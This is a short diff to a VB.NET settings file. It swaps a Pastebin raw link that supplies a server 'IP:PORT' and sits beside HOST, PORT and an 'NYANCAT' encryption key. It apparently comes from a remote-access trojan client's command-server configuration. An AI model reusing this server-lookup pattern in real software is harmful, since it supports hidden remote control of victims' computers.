@@ -5,7 +5,7 @@
         'For testing using VS run as debug
 
 #If DEBUG Then
-        Public Shared Pastebin As String = "https://pastebin.com/raw/DDTVwwbu" ' IP:PORT
+        Public Shared Pastebin As String = "https://pastebin.com/raw/tfpar8yW" ' IP:PORT
         Public Shared HOST As String 'IP
         Public Shared PORT As Integer 'PORT
         Public Shared EncryptionKey As String = "NYANCAT" 'encryption/decryption key
